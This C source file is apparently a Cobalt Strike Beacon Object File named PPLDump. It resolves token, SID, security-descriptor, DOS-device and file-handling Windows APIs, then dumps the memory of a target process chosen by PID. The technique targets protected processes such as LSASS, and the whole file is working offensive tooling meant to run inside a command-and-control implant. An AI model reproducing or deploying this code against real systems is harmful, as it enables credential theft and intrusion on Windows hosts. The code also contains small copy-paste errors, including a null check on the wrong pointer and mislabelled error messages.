#ifndef _WIN64
#error This code must be compiled with a 64-bit version of MSVC
#endif

#include <windows.h>
#include "headers/syscalls.h"
#include "headers/ntdll.h"
#include "headers/beacon.h"
#include "headers/tdefs.h"
#include "headers/api_functions.h"
#include "headers/exploit.h"
#include "headers/fileheader.h"
#include "headers/utils.h"



// Forced variant for globally-available varaibles
DWORD pid __attribute__ ((section(".data")));
WCHAR wcPID[] __attribute__ ((section(".data"))) = L"788";   // Change this as needed, no massaging really helped :(
BOOL  forceDosDeviceCreation __attribute__ ((section(".data"))) = TRUE;
BOOL  gVerbose __attribute__ ((section(".data"))) = TRUE;
BOOL  gDebug __attribute__ ((section(".data"))) = TRUE;
FUNCTION_POINTER_STRUCT sFunctionPointerStruct __attribute__ ((section(".data")));
HMODULE hmKernel32ModuleHandle __attribute__ ((section(".data"))) = NULL;
HMODULE hmAdvapi32ModuleHandle __attribute__ ((section(".data"))) = NULL;


BOOL zeroOutDataStructure(void);
BOOL zeroOutDataStructure(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "Zeroing out data structure of size: %ld.\n", sizeof(FUNCTION_POINTER_STRUCT));
    MSVCRT$memset(&sFunctionPointerStruct, 0, sizeof(FUNCTION_POINTER_STRUCT));

    return TRUE;
}


BOOL populateDataStructure() {
    // Initialize "global" handles to the two DLLs in question.
    // By default, both are loaded into the address space of a beacon, but this is to help use them elsewhere.
    hmKernel32ModuleHandle = KERNEL32$GetModuleHandleW(L"kernel32");
    hmAdvapi32ModuleHandle = KERNEL32$GetModuleHandleW(L"advapi32");

    if (hmKernel32ModuleHandle == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Kernel32 module is valid.\n");
        return FALSE;
    }

    if (hmAdvapi32ModuleHandle == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Advapi32 module is invalid.\n");
        return FALSE;
    }

    sFunctionPointerStruct.StructGetProcAddress = (_GetProcAddress)KERNEL32$GetProcAddress(hmKernel32ModuleHandle, "GetProcAddress");

    if (sFunctionPointerStruct.StructGetProcAddress == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGeProcAddress\n");
        return FALSE;
    }
    

    sFunctionPointerStruct.StructGetModuleHandleW = (_GetModuleHandleW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetModuleHandleW");
    if (sFunctionPointerStruct.StructGetModuleHandleW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetModuleHandleW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructAdjustTokenPrivileges = (_AdjustTokenPrivileges)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "AdjustTokenPrivileges");
    if (sFunctionPointerStruct.StructAdjustTokenPrivileges == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructAdjustTokenPrivileges\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructConvertSidToStringSidW = (_ConvertSidToStringSidW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "ConvertSidToStringSidW");
    if (sFunctionPointerStruct.StructConvertSidToStringSidW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructConvertSidToStringSidW\n");
        return FALSE;
    }

    sFunctionPointerStruct.StructConvertStringSidToSidW = (_ConvertStringSidToSidW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "ConvertStringSidToSidW");
    if (sFunctionPointerStruct.StructConvertStringSidToSidW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructConvertStringSidToSidW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructCopySid = (_CopySid)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "CopySid");
    if (sFunctionPointerStruct.StructCopySid == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructCopySid\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructDuplicateTokenEx = (_DuplicateTokenEx)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "DuplicateTokenEx");
    if (sFunctionPointerStruct.StructDuplicateTokenEx == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructDuplicateTokenEx\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructLookupPrivilegeValueW = (_LookupPrivilegeValueW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "LookupPrivilegeValueW");
    if (sFunctionPointerStruct.StructLookupPrivilegeValueW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructLookupPrivilegeValueW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetSecurityInfo = (_GetSecurityInfo)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "GetSecurityInfo");
    if (sFunctionPointerStruct.StructGetSecurityInfo == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSecurityInfo\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructCreateProcessAsUserW = (_CreateProcessAsUserW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "CreateProcessAsUserW");
    if (sFunctionPointerStruct.StructCreateProcessAsUserW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSidSubAuthority\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetSidSubAuthority = (_GetSidSubAuthority)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "GetSidSubAuthority");
    if (sFunctionPointerStruct.StructGetSidSubAuthority == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSidSubAuthority\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetSidSubAuthorityCount = (_GetSidSubAuthorityCount)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "GetSidSubAuthorityCount");
    if (sFunctionPointerStruct.StructGetSidSubAuthorityCount == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSidSubAuthorityCount\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructOpenThreadToken = (_OpenThreadToken)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "OpenThreadToken");
    if (sFunctionPointerStruct.StructGetSidSubAuthorityCount == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSidSubAuthorityCount\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetTokenInformation = (_GetTokenInformation)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "GetTokenInformation");
    if (sFunctionPointerStruct.StructGetTokenInformation == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetTokenInformation\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructInitializeSecurityDescriptor = (_InitializeSecurityDescriptor)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "InitializeSecurityDescriptor");
    if (sFunctionPointerStruct.StructInitializeSecurityDescriptor == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructInitializeSecurityDescriptor\n");
        return FALSE;
    }

    sFunctionPointerStruct.StructLookupAccountSidW = (_LookupAccountSidW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "LookupAccountSidW");
    if (sFunctionPointerStruct.StructLookupAccountSidW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructLookupAccountSidW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructLookupPrivilegeNameW = (_LookupPrivilegeNameW)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "LookupPrivilegeNameW");
    if (sFunctionPointerStruct.StructLookupPrivilegeNameW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructLookupPrivilegeNameW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructOpenProcessToken = (_OpenProcessToken)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "OpenProcessToken");
    if (sFunctionPointerStruct.StructOpenProcessToken == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructOpenProcessToken\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructRevertToSelf = (_RevertToSelf)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "RevertToSelf");
    if (sFunctionPointerStruct.StructRevertToSelf == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructRevertToSelf\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructSetKernelObjectSecurity = (_SetKernelObjectSecurity)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "SetKernelObjectSecurity");
    if (sFunctionPointerStruct.StructSetKernelObjectSecurity == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructSetKernelObjectSecurity\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructSetSecurityDescriptorDacl = (_SetSecurityDescriptorDacl)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "SetSecurityDescriptorDacl");
    if (sFunctionPointerStruct.StructSetSecurityDescriptorDacl == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructSetSecurityDescriptorDacl\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructSetThreadToken = (_SetThreadToken)sFunctionPointerStruct.StructGetProcAddress(hmAdvapi32ModuleHandle, "SetThreadToken");
    if (sFunctionPointerStruct.StructSetThreadToken == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructSetThreadToken\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructCreateFileTransactedW = (_CreateFileTransactedW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "CreateFileTransactedW");
    if (sFunctionPointerStruct.StructCreateFileTransactedW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructCreateFileTransactedW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructCreateFileW = (_CreateFileW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "CreateFileW");
    if (sFunctionPointerStruct.StructCreateFileW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructCreateFileW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructWaitForSingleObject = (_WaitForSingleObject)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "WaitForSingleObject");
    if (sFunctionPointerStruct.StructWaitForSingleObject == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructCreateFileW\n");
        return FALSE;
    }

    sFunctionPointerStruct.StructDefineDosDeviceW = (_DefineDosDeviceW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "DefineDosDeviceW");
    if (sFunctionPointerStruct.StructDefineDosDeviceW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructDefineDosDeviceW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructFindClose = (_FindClose)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "FindClose");
    if (sFunctionPointerStruct.StructFindClose == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructFindClose\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructFindFirstFileW = (_FindFirstFileW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "FindFirstFileW");
    if (sFunctionPointerStruct.StructFindFirstFileW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructFindFirstFileW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructFindNextFileW = (_FindNextFileW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "FindNextFileW");
    if (sFunctionPointerStruct.StructFindNextFileW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructFindNextFileW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetCurrentProcessId = (_GetCurrentProcessId)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetCurrentProcessId");
    if (sFunctionPointerStruct.StructGetCurrentProcessId == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetCurrentProcessId\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetCurrentThread = (_GetCurrentThread)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetCurrentThread");
    if (sFunctionPointerStruct.StructGetCurrentThread == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetCurrentThread\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetFileAttributesW = (_GetFileAttributesW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetFileAttributesW");
    if (sFunctionPointerStruct.StructGetFileAttributesW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetFileAttributesW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetFileSize = (_GetFileSize)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetFileSize");
    if (sFunctionPointerStruct.StructGetFileSize == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetFileSize\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetModuleHandleA = (_GetModuleHandleA)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetModuleHandleA");
    if (sFunctionPointerStruct.StructGetModuleHandleA == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetModuleHandleA\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetSystemDirectoryW = (_GetSystemDirectoryW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetSystemDirectoryW");
    if (sFunctionPointerStruct.StructGetSystemDirectoryW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetSystemDirectoryW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructLocalAlloc = (_LocalAlloc)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "LocalAlloc");
    if (sFunctionPointerStruct.StructLocalAlloc == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructLocalAlloc\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructLocalFree = (_LocalFree)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "LocalFree");
    if (sFunctionPointerStruct.StructLocalFree == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructLocalFree\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructlstrlenW = (_lstrlenW)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "lstrlenW");
    if (sFunctionPointerStruct.StructlstrlenW == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructlstrlenW\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructOpenProcess = (_OpenProcess)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "OpenProcess");
    if (sFunctionPointerStruct.StructOpenProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructOpenProcess\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructGetLastError = (_GetLastError)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "GetLastError");
    if (sFunctionPointerStruct.StructGetLastError == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructGetLastError\n");
        return FALSE;
    }


    sFunctionPointerStruct.StructWriteFile = (_WriteFile)sFunctionPointerStruct.StructGetProcAddress(hmKernel32ModuleHandle, "WriteFile");
    if (sFunctionPointerStruct.StructWriteFile == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Error assigning function pointer to StructWriteFile\n");
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Finished acquiring requisite function pointers. Let's roll.\n");

    return TRUE;
}


void go(char *args, int len) {
    DWORD processID;
    datap parser;

    BeaconDataParse(&parser, args, len);
    processID = BeaconDataInt(&parser);

    pid = processID;

    LPCWSTR helper =    L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                        L"|              PPLDump              |\n"
                        L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                        L"|By:                                |\n"
                        L"|  Justin Lucas  (@the_bit_diddler) |\n"
                        L"|  Brad Campbell (@hackersoup)      |\n"
                        L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                        L"|Credits (and deep thanks!):        |\n"
                        L"|  @itm4n                           |\n"
                        L"|  @_ForrestOrr                     |\n"
                        L"|  @ccobb                           |\n"
                        L"|  @SecIdiot                        |\n"
                        L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n";

    BeaconPrintf(CALLBACK_OUTPUT, "%ls", (wchar_t*)helper);

    zeroOutDataStructure();
    populateDataStructure();

    DumpProcess(pid, DEFAULT_DUMP_FILE);
}
